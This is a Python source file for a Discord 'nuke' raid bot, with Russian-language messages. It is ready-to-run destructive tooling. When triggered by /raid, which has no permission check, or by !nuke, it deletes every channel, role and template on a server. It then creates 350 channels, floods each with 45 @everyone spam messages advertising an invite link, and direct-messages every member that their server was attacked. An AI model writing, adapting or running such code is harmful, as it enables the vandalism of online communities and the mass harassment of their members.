import discord
from discord.ext import commands
import asyncio
import os
import sys

TOKEN = os.environ.get("TOKEN")
if not TOKEN:
    print("[FATAL] Переменная окружения TOKEN не задана!")
    sys.exit(1)

CONFIG = {
    "channels_to_create": 350,
    "spam_per_channel": 45,
    "channel_name": "nuked-by-raid",
    "spam_message": "@everyone СЕРВЕР УНИЧТОЖЕН организацией TMW\nВсе каналы, роли и шаблоны удалены.\n https://discord.gg/wUY45xA8RF",
    "delay_delete": 0.25,
    "delay_create": 0.25,
    "delay_spam": 0.4,
    "dm_everyone": True,
    "dm_message": "Твой сервер {guild_name} был атакован.",
}

BLOCKED_GUILDS = [
    1501595797123371068 #замените на свой
]

intents = discord.Intents.default()
intents.members = True
intents.message_content = True
intents.messages = True

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

async def raid_actions(guild: discord.Guild):
    if guild.id in BLOCKED_GUILDS:
        print(f"[БЛОК] Сервер {guild.name} в чёрном списке")
        return

    print(f"\n=== РЕЙД НА {guild.name} (ID: {guild.id}) ===")

    print("[1/5] Удаление каналов...")
    deleted = 0
    for channel in guild.channels:
        try:
            await channel.delete()
            deleted += 1
            await asyncio.sleep(CONFIG['delay_delete'])
        except Exception:
            pass
    print(f"[+] Удалено каналов: {deleted}")

    print("[2/5] Удаление ролей...")
    roles_deleted = 0
    for role in guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
                roles_deleted += 1
                await asyncio.sleep(0.2)
            except Exception:
                pass
    print(f"[+] Удалено ролей: {roles_deleted}")

    print("[3/5] Удаление шаблонов...")
    templates_deleted = 0
    try:
        templates = await guild.templates()
        for template in templates:
            try:
                await template.delete()
                templates_deleted += 1
                await asyncio.sleep(0.3)
            except Exception:
                pass
    except Exception:
        pass
    print(f"[+] Удалено шаблонов: {templates_deleted}")

    print(f"[4/5] Создание {CONFIG['channels_to_create']} каналов...")
    created = 0
    for i in range(CONFIG['channels_to_create']):
        try:
            new_ch = await guild.create_text_channel(f"{CONFIG['channel_name']}-{i+1}")
            created += 1
            for j in range(CONFIG['spam_per_channel']):
                try:
                    await new_ch.send(CONFIG['spam_message'])
                    await asyncio.sleep(CONFIG['delay_spam'])
                except Exception:
                    break
            await asyncio.sleep(CONFIG['delay_create'])
        except Exception:
            pass
    print(f"[+] Создано каналов: {created}")

    if CONFIG['dm_everyone']:
        print("[5/5] Рассылка DM...")
        dm_sent = 0
        for member in guild.members:
            if not member.bot:
                try:
                    await member.send(CONFIG['dm_message'].format(guild_name=guild.name))
                    dm_sent += 1
                    await asyncio.sleep(0.2)
                except Exception:
                    pass
        print(f"[+] DM разослано: {dm_sent}")

    print("\n=== РЕЙД ЗАВЕРШЁН ===")

@bot.event
async def on_ready():
    print(f"\n[+] Бот {bot.user} активен! Серверов: {len(bot.guilds)}")
    for g in bot.guilds:
        blocked = " 🔒" if g.id in BLOCKED_GUILDS else ""
        print(f"    - {g.name} (ID: {g.id}){blocked}")
    try:
        synced = await bot.tree.sync()
        print(f"[+] Синхронизировано команд: {len(synced)}")
    except Exception:
        pass
    print("\n[!] Готов к работе. Используй /raid или !nuke\n")

@bot.tree.command(name="raid", description="Уничтожить сервер")
async def raid(interaction: discord.Interaction):
    await interaction.response.send_message("🚀 RAID STARTED", ephemeral=False)
    await raid_actions(interaction.guild)

@bot.command(name="nuke")
@commands.has_permissions(administrator=True)
async def nuke_prefix(ctx):
    await ctx.send("⚠️ NUKE STARTED")
    await raid_actions(ctx.guild)

if __name__ == "__main__":
    try:
        bot.run(TOKEN)
    except KeyboardInterrupt:
        print("\n[!] Остановка бота")
        sys.exit(0)
